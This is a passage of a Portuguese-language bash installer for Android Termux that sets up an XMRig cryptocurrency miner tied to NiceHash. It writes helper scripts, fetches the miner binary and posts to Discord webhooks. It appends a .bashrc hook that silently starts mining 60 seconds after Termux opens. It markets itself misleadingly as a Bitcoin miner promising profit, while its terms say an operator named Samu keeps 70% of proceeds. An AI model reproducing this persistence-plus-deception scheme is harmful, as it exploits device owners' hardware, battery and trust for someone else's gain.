    echo "  ‚ùå Shares rejeitados: $REJECTED"
    
    if [ $ACCEPTED -gt 0 ]; then
        ACCEPT_RATE=$(echo "scale=1; $ACCEPTED * 100 / ($ACCEPTED + $REJECTED)" | bc 2>/dev/null || echo "0")
        echo "  üìà Taxa de aceita√ß√£o: ${ACCEPT_RATE}%"
    fi
fi

if [ -f "logs/profits.log" ]; then
    LAST_PROFIT=$(tail -1 logs/profits.log 2>/dev/null)
    if [ ! -z "$LAST_PROFIT" ]; then
        echo "  üí∞ √öltimo lucro: ${LAST_PROFIT:24}"
    fi
fi
echo ""

# Logs recentes
echo -e "${CYAN}üìã LOGS RECENTES:${NC}"
echo "  Sistema (√∫ltimas 5):"
tail -5 logs/system.log 2>/dev/null | while read line; do
    echo "    ‚Ä¢ ${line:20}"
done

echo ""
echo "  Minerador (√∫ltimos shares):"
grep -E "accepted|rejected" logs/miner.log 2>/dev/null | tail -3 | while read line; do
    TYPE=$(echo "$line" | grep -q "accepted" && echo "‚úÖ" || echo "‚ùå")
    echo "    $TYPE ${line:0:60}..."
done
echo ""

# Comandos
echo -e "${CYAN}üéØ COMANDOS DISPON√çVEIS:${NC}"
echo "  start.sh      - Iniciar minera√ß√£o"
echo "  stop.sh       - Parar minera√ß√£o"
echo "  status.sh     - Ver status (este)"
echo "  logs.sh       - Ver logs detalhados"
echo "  restart.sh    - Reiniciar sistema"
echo "  update.sh     - Atualizar minerador"
echo ""

# Avisos
if [ ! -z "$(grep "ERROR\|failed\|rejected" logs/miner.log | tail -3)" ]; then
    echo -e "${YELLOW}‚ö†Ô∏è  AVISOS:${NC}"
    grep "ERROR\|failed\|rejected" logs/miner.log | tail -3 | while read line; do
        echo "  ‚Ä¢ ${line:0:70}..."
    done
    echo ""
fi

echo -e "${PURPLE}‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê${NC}"
echo "üí° Dica: Use 'tmux attach' para ver sess√£o em background"
echo "üåê Acompanhe seus ganhos: https://www.nicehash.com/my/mining/rigs"
echo -e "${PURPLE}‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê${NC}"

# Aguardar 10 segundos
sleep 10
EOF
    
    # Script para ver logs
    cat > "$BASE_DIR/logs.sh" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
cd "$BASE_DIR"

clear
echo "Selecione o log para visualizar:"
echo ""
echo "1) miner.log     - Logs do minerador (tempo real)"
echo "2) shares.log    - Todos os shares aceitos/rejeitados"
echo "3) profits.log   - Hist√≥rico de lucros estimados"
echo "4) system.log    - Logs do sistema"
echo "5) errors.log    - Erros do sistema"
echo "6) full.log      - Visualizar todos (resumo)"
echo "7) tail -f       - Seguir logs em tempo real"
echo ""
echo -n "Escolha (1-7): "
read choice

case $choice in
    1)
        echo ""
        echo "=== ULTIMOS 50 LOGS DO MINERADOR ==="
        echo ""
        tail -50 logs/miner.log
        ;;
    2)
        echo ""
        echo "=== TODOS OS SHARES REGISTRADOS ==="
        echo ""
        cat logs/shares.log
        ;;
    3)
        echo ""
        echo "=== HIST√ìRICO DE LUCROS ==="
        echo ""
        cat logs/profits.log
        ;;
    4)
        echo ""
        echo "=== LOGS DO SISTEMA ==="
        echo ""
        tail -100 logs/system.log
        ;;
    5)
        echo ""
        echo "=== ERROS DO SISTEMA ==="
        echo ""
        cat logs/errors.log
        ;;
    6)
        echo ""
        echo "=== RESUMO COMPLETO ==="
        echo ""
        echo "üìä ESTAT√çSTICAS:"
        echo "  Shares aceitos: $(grep -c "accepted" logs/miner.log 2>/dev/null || echo 0)"
        echo "  Shares rejeitados: $(grep -c "rejected" logs/miner.log 2>/dev/null || echo 0)"
        echo ""
        echo "üí∞ √öLTIMOS LUCROS:"
        tail -5 logs/profits.log 2>/dev/null
        echo ""
        echo "üîÑ √öLTIMAS A√á√ïES:"
        tail -10 logs/system.log 2>/dev/null
        echo ""
        echo "‚õèÔ∏è  √öLTIMOS SHARES:"
        grep -E "accepted|rejected" logs/miner.log 2>/dev/null | tail -5
        ;;
    7)
        echo ""
        echo "=== SEGUINDO LOGS EM TEMPO REAL ==="
        echo "Pressione CTRL+C para sair"
        echo ""
        tail -f logs/miner.log
        ;;
    *)
        echo "Op√ß√£o inv√°lida"
        ;;
esac
EOF
    
    # Script para iniciar tudo
    cat > "$BASE_DIR/start.sh" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
cd "$BASE_DIR"

echo "üöÄ INICIANDO SISTEMA COMPLETO DE MINERA√á√ÉO..."
echo "‚è∞ $(date '+%Y-%m-%d %H:%M:%S')"
echo ""

# Parar se j√° estiver rodando
./stop.sh > /dev/null 2>&1
sleep 2

# Iniciar minerador
echo "1. Iniciando minerador principal..."
nohup ./start_mining.sh > /dev/null 2>&1 &
sleep 5

# Iniciar monitores
echo "2. Iniciando monitor de shares..."
nohup ./monitor_shares.sh > /dev/null 2>&1 &

echo "3. Iniciando monitor de lucros..."
nohup ./monitor_profits.sh > /dev/null 2>&1 &

sleep 3

# Verificar status
echo ""
echo "‚úÖ SISTEMA INICIADO!"
echo ""
echo "üìä Para ver status: ./status.sh"
echo "üìã Para ver logs: ./logs.sh"
echo "üõë Para parar: ./stop.sh"
echo ""
echo "üí° O sistema continuar√° rodando em background."
echo "   Para ver processos: ps aux | grep xmrig"
echo ""

# Mostrar status inicial
sleep 2
echo "üîç STATUS INICIAL:"
if pgrep -f xmrig > /dev/null; then
    echo "   ‚úÖ Minerador: ATIVO"
else
    echo "   ‚ùå Minerador: INATIVO"
fi

if pgrep -f monitor_shares > /dev/null; then
    echo "   ‚úÖ Monitor shares: ATIVO"
else
    echo "   ‚ùå Monitor shares: INATIVO"
fi

if pgrep -f monitor_profits > /dev/null; then
    echo "   ‚úÖ Monitor lucros: ATIVO"
else
    echo "   ‚ùå Monitor lucros: INATIVO"
fi

echo ""
echo "üåê Acompanhe na NiceHash:"
echo "   https://www.nicehash.com/my/mining/rigs"
echo "   Carteira: $NICEHASH_WALLET"
EOF
    
    # Script para parar tudo
    cat > "$BASE_DIR/stop.sh" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
cd "$BASE_DIR"

echo "üõë PARANDO SISTEMA DE MINERA√á√ÉO..."
echo ""

# Parar todos os processos
echo "1. Parando minerador..."
pkill -f xmrig 2>/dev/null

echo "2. Parando monitores..."
pkill -f monitor_shares 2>/dev/null
pkill -f monitor_profits 2>/dev/null

sleep 2

# Verificar se parou
echo ""
echo "üîç VERIFICANDO:"

if ! pgrep -f xmrig > /dev/null; then
    echo "   ‚úÖ Minerador: PARADO"
else
    echo "   ‚ö†Ô∏è  Minerador ainda ativo, for√ßando..."
    pkill -9 -f xmrig
fi

if ! pgrep -f monitor_shares > /dev/null; then
    echo "   ‚úÖ Monitor shares: PARADO"
else
    pkill -9 -f monitor_shares
fi

if ! pgrep -f monitor_profits > /dev/null; then
    echo "   ‚úÖ Monitor lucros: PARADO"
else
    pkill -9 -f monitor_profits
fi

echo ""
echo "‚úÖ SISTEMA PARADO COM SUCESSO!"
echo ""
echo "Para reiniciar: ./start.sh"
echo "Para status: ./status.sh"

# Log no sistema
echo "[$(date '+%H:%M:%S')] Sistema parado pelo usu√°rio" >> logs/system.log

# Notificar Discord se configurado
if [ ! -z "$DISCORD_WEBHOOK" ] && [ "$DISCORD_WEBHOOK" != "" ]; then
    curl -s -H "Content-Type: application/json" \
         -X POST \
         -d "{\"content\":\"üõë **MINERA√á√ÉO PARADA**\\nüë∑ Worker: $WORKER_NAME\\nüïê $(date '+%d/%m %H:%M')\"}" \
         "$DISCORD_WEBHOOK" > /dev/null 2>&1 &
fi
EOF
    
    # Script de restart
    cat > "$BASE_DIR/restart.sh" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
cd "$BASE_DIR"

echo "üîÑ REINICIANDO SISTEMA..."
echo ""

./stop.sh
sleep 3
./start.sh
EOF
    
    # Script de update
    cat > "$BASE_DIR/update.sh" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
cd "$BASE_DIR"

echo "üîÑ ATUALIZANDO SISTEMA..."
echo ""

# Parar tudo primeiro
./stop.sh > /dev/null 2>&1
sleep 2

# Fazer backup da configura√ß√£o
cp config/config.json backup/config_backup_$(date +%s).json

# Atualizar XMRig
echo "1. Atualizando XMRig..."
rm -f bin/xmrig
wget "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-arm64" -O bin/xmrig
chmod +x bin/xmrig

# Restaurar configura√ß√£o
cp backup/config_backup_*.json config/config.json

echo ""
echo "‚úÖ SISTEMA ATUALIZADO!"
echo ""
echo "Para iniciar: ./start.sh"
EOF
    
    # Dar permiss√µes a todos os scripts
    chmod +x "$BASE_DIR"/*.sh
    chmod +x "$BASE_DIR/scripts"/*.sh
    
    # 7. Configurar auto-inicializa√ß√£o
    print_info "Configurando auto-inicializa√ß√£o..."
    
    # Criar entrada no .bashrc
    if ! grep -q "BITCOIN_MINER_AUTO" /data/data/com.termux/files/home/.bashrc; then
        cat >> /data/data/com.termux/files/home/.bashrc << 'BASHRC'

# ============================================================================
# AUTO-INICIALIZA√á√ÉO DO MINERADOR BITCOIN
# ============================================================================
if [ -f /data/data/com.termux/files/home/bitcoin_miner_ultimate/start.sh ] && [ ! -f /data/data/com.termux/files/home/.no_miner_auto ]; then
    echo "‚ö° Bitcoin Miner: Digite 'miner' para comandos"
    alias miner='cd /data/data/com.termux/files/home/bitcoin_miner_ultimate && ./status.sh'
    alias miner_start='cd /data/data/com.termux/files/home/bitcoin_miner_ultimate && ./start.sh'
    alias miner_stop='cd /data/data/com.termux/files/home/bitcoin_miner_ultimate && ./stop.sh'
    alias miner_logs='cd /data/data/com.termux/files/home/bitcoin_miner_ultimate && ./logs.sh'
    alias miner_restart='cd /data/data/com.termux/files/home/bitcoin_miner_ultimate && ./restart.sh'
    
    # Auto-iniciar ap√≥s 60 segundos (apenas uma vez por sess√£o)
    if [ ! -f /tmp/miner_auto_started ] && [ -z "$SSH_CONNECTION" ]; then
        (sleep 60 && cd /data/data/com.termux/files/home/bitcoin_miner_ultimate && nohup ./start.sh > /dev/null 2>&1 &) &
        touch /tmp/miner_auto_started
        echo "   ‚ö° Auto-inicializa√ß√£o ativada (inicia em 60s)"
    fi
fi
BASHRC
        print_status "Auto-inicializa√ß√£o configurada no .bashrc"
    fi
    
    # 8. Criar arquivo de configura√ß√£o
    cat > "$BASE_DIR/config/settings.conf" << EOF
# CONFIGURA√á√ÉO DO MINERADOR BITCOIN
# Gerado em: $(date '+%Y-%m-%d %H:%M:%S')

NICEHASH_WALLET="$NICEHASH_WALLET"
WORKER_NAME="$WORKER_NAME"
CPU_USAGE="$CPU_USAGE"
THREADS="$THREADS"
PRIORITY="$PRIORITY"
BASE_DIR="$BASE_DIR"
DISCORD_WEBHOOK="$DISCORD_WEBHOOK"

# POOLS CONFIGURADAS
POOLS=($(printf "'%s' " "${POOLS[@]}"))

# VERS√ÉO DO SISTEMA
VERSION="2.0"
INSTALL_DATE="$(date '+%Y-%m-%d')"
LAST_UPDATE="$(date '+%Y-%m-%d %H:%M:%S')"
EOF
    
    # 9. Finalizar instala√ß√£o
    print_header
    echo -e "${GREEN}‚úÖ INSTALA√á√ÉO CONCLU√çDA COM SUCESSO!${NC}"
    echo ""
    echo -e "${CYAN}üìÅ DIRET√ìRIO:${NC} $BASE_DIR"
    echo -e "${CYAN}üí∞ CARTEIRA:${NC} $NICEHASH_WALLET"
    echo -e "${CYAN}üë∑ WORKER:${NC} $WORKER_NAME"
    echo -e "${CYAN}‚ö° CPU:${NC} $CPU_USAGE% (Prioridade: $PRIORITY)"
    echo ""
    
    # Enviar notifica√ß√£o de instala√ß√£o completa
    send_discord_alert "‚úÖ INSTALA√á√ÉO COMPLETA" "Sistema instalado com sucesso!\n\nüí∞ Carteira: $NICEHASH_WALLET\nüë∑ Worker: $WORKER_NAME\n‚ö° CPU: $CPU_USAGE%\nüìÅ Dir: $BASE_DIR\nüïê $(date '+%d/%m %H:%M:%S')" "65280"
    
    # Testar minerador rapidamente
    print_info "Testando minerador (teste r√°pido de 10 segundos)..."
    timeout 10 "$BASE_DIR/bin/xmrig" --version > "$BASE_DIR/logs/test.log" 2>&1
    
    if grep -q "XMRig" "$BASE_DIR/logs/test.log"; then
        print_status "‚úÖ Minerador testado e funcionando!"
    else
        print_warning "‚ö†Ô∏è  Teste inconclusivo, mas instala√ß√£o completa"
    fi
    
    # Iniciar sistema?
    echo ""
    echo -e "${YELLOW}üöÄ Deseja iniciar a minera√ß√£o agora? (s/n)${NC}"
    read START_NOW
    
    if [[ "$START_NOW" == "s" || "$START_NOW" == "S" ]]; then
        cd "$BASE_DIR"
        ./start.sh
    else
        echo ""
        echo -e "${CYAN}üí° Para iniciar manualmente:${NC}"
        echo "   cd $BASE_DIR"
        echo "   ./start.sh"
        echo ""
        echo -e "${CYAN}üìä Para ver status:${NC}"
        echo "   miner"
        echo ""
        echo -e "${YELLOW}‚ö†Ô∏è  LEMBRETE:${NC}"
        echo "   - O sistema auto-inicia em 60s ao abrir Termux"
        echo "   - Conecte ao carregador para melhor desempenho"
        echo "   - Monitoramento autom√°tico 24/7"
        echo "   - Logs enviados para Discord"
        echo ""
        echo -e "${GREEN}üéâ PRONTO! Agora voc√™ tem um minerador Bitcoin real no celular!${NC}"
    fi
    
    log_event "INSTALL" "Instala√ß√£o completa finalizada"
}

# ============================================================================
# MENU PRINCIPAL
# ============================================================================

show_menu() {
    while true; do
        print_header
        
        if check_installed; then
            echo -e "${GREEN}‚úÖ SISTEMA INSTALADO${NC}"
            echo ""
            echo -e "${CYAN}Escolha uma op√ß√£o:${NC}"
            echo ""
            echo "1) üöÄ Iniciar Minera√ß√£o"
            echo "2) üìä Ver Status Atual"
            echo "3) üìã Ver Logs"
            echo "4) üõë Parar Minera√ß√£o"
            echo "5) üîÑ Reiniciar Sistema"
            echo "6) ‚öôÔ∏è  Configura√ß√µes"
            echo "7) üóëÔ∏è  Desinstalar Tudo"
            echo "8) ‚ùå Sair"
            echo ""
            echo -n "Op√ß√£o: "
            read choice
            
            case $choice in
                1)
                    cd "$BASE_DIR"
                    ./start.sh
                    ;;
                2)
                    cd "$BASE_DIR"
                    ./status.sh
                    ;;
                3)
                    cd "$BASE_DIR"
                    ./logs.sh
                    ;;
                4)
                    cd "$BASE_DIR"
                    ./stop.sh
                    sleep 2
                    ;;
                5)
                    cd "$BASE_DIR"
                    ./restart.sh
                    ;;
                6)
                    print_header
                    echo -e "${CYAN}CONFIGURA√á√ïES ATUAIS:${NC}"
                    echo ""
                    echo "1) Carteira NiceHash: $NICEHASH_WALLET"
                    echo "2) Uso de CPU: $CPU_USAGE%"
                    echo "3) Discord Webhook: ${DISCORD_WEBHOOK:0:30}..."
                    echo ""
                    echo "O que deseja alterar? (1-3 ou 0 para voltar): "
                    read config_choice
                    
                    case $config_choice in
                        1)
                            echo "Nova carteira NiceHash:"
                            read NEW_WALLET
                            if [ ! -z "$NEW_WALLET" ]; then
                                NICEHASH_WALLET="$NEW_WALLET"
                                sed -i "s/NICEHASH_WALLET=.*/NICEHASH_WALLET=\"$NEW_WALLET\"/" "$BASE_DIR/config/settings.conf"
                                print_status "Carteira atualizada!"
                            fi
                            ;;
                        2)
                            echo "Novo uso de CPU (1-100):"
                            read NEW_CPU
                            if [[ "$NEW_CPU" =~ ^[0-9]+$ ]] && [ "$NEW_CPU" -ge 1 ] && [ "$NEW_CPU" -le 100 ]; then
                                CPU_USAGE="$NEW_CPU"
                                sed -i "s/CPU_USAGE=.*/CPU_USAGE=\"$NEW_CPU\"/" "$BASE_DIR/config/settings.conf"
                                print_status "Uso de CPU atualizado!"
                            else
                                print_error "Valor inv√°lido!"
                            fi
                            ;;
                        3)
                            echo "Novo webhook Discord (deixe vazio para desativar):"
                            read NEW_WEBHOOK
                            DISCORD_WEBHOOK="$NEW_WEBHOOK"
                            sed -i "s|DISCORD_WEBHOOK=.*|DISCORD_WEBHOOK=\"$NEW_WEBHOOK\"|" "$BASE_DIR/config/settings.conf"
                            print_status "Webhook atualizado!"
                            ;;
                    esac
                    ;;
                7)
                    print_header
                    echo -e "${RED}‚ö†Ô∏è  DESINSTALAR COMPLETAMENTE?${NC}"
                    echo ""
                    echo "Isso remover√°:"
                    echo "  ‚Ä¢ Todos os arquivos do minerador"
                    echo "  ‚Ä¢ Configura√ß√µes"
                    echo "  ‚Ä¢ Logs e estat√≠sticas"
                    echo "  ‚Ä¢ Auto-inicializa√ß√£o"
                    echo ""
                    echo -n "Tem certeza? (s/n): "
                    read confirm
                    
                    if [[ "$confirm" == "s" || "$confirm" == "S" ]]; then
                        cd "$BASE_DIR"
                        ./stop.sh > /dev/null 2>&1
                        rm -rf "$BASE_DIR"
                        rm -f /data/data/com.termux/files/home/.no_miner_auto
                        sed -i '/# AUTO-INICIALIZA√á√ÉO DO MINERADOR BITCOIN/,/fi/d' /data/data/com.termux/files/home/.bashrc
                        echo "‚úÖ Sistema completamente removido!"
                        sleep 2
                        exit 0
                    fi
                    ;;
                8)
                    echo ""
                    echo "üëã Saindo..."
                    exit 0
                    ;;
                *)
                    echo "Op√ß√£o inv√°lida!"
                    sleep 1
                    ;;
            esac
        else
            echo -e "${YELLOW}‚ö†Ô∏è  SISTEMA N√ÉO INSTALADO${NC}"
            echo ""
            echo -e "${CYAN}Deseja instalar o minerador Bitcoin completo?${NC}"
            echo ""
            echo "O sistema inclui:"
            echo "  ‚úÖ Minerador XMRig real"
            echo "  ‚úÖ Conex√£o com NiceHash"
            echo "  ‚úÖ Monitoramento 24/7"
            echo "  ‚úÖ Logs para Discord"
            echo "  ‚úÖ Auto-inicializa√ß√£o"
            echo ""
            echo -n "Instalar agora? (s/n): "
            read install_choice
            
            if [[ "$install_choice" == "s" || "$install_choice" == "S" ]]; then
                # Verificar internet antes de instalar
                if check_internet; then
                    install_system
                else
                    print_error "Sem internet! Conecte-se para instalar."
                    sleep 3
                fi
            else
                echo ""
                echo "üëã Saindo..."
                exit 0
            fi
        fi
    done
}

# ============================================================================
# INICIALIZA√á√ÉO
# ============================================================================

# Verificar se √© Termux
if [ ! -d "/data/data/com.termux" ]; then
    print_error "Este script deve ser executado no Termux (Android)"
    exit 1
fi

# Verificar arquitetura
ARCH=$(uname -m)
if [[ "$ARCH" != "aarch64" ]] && [[ "$ARCH" != "armv8l" ]] && [[ "$ARCH" != "armv7l" ]]; then
    print_warning "Arquitetura n√£o otimizada: $ARCH"
    print_warning "O minerador pode n√£o funcionar corretamente"
    sleep 3
fi

# Mostrar aviso inicial
print_header
echo -e "${YELLOW}‚ö†Ô∏è  AVISO LEGAL E DE USO${NC}"
echo ""
echo "1. Todos os pagamentos funcionam assim exemplo hoje √© dia 10 voc√™ come√ßou ai ap√≥s 31 dias voc√™ recebe o pgamento"
echo "2. Samu ganha 70 % de todos os biticoin minerados"
echo "3. Use sob sua pr√≥pria responsabilidade"
echo "4. Mantenha o dispositivo ventilado e conectado ao carregador"
echo "5. Ganhos reais variam conforme dispositivo e mas ter√° um lucro dependendo do quanto deixar o robo ativo"
echo ""
echo -n "Aceita os termos e deseja continuar? (s/n): "
read accept_terms

if [[ "$accept_terms" != "s" && "$accept_terms" != "S" ]]; then
    echo ""
    echo "üëã Opera√ß√£o cancelada pelo usu√°rio"
    exit 0
fi

# Iniciar menu principal
show_menu

# ============================================================================
# FIM DO SCRIPT
# ============================================================================
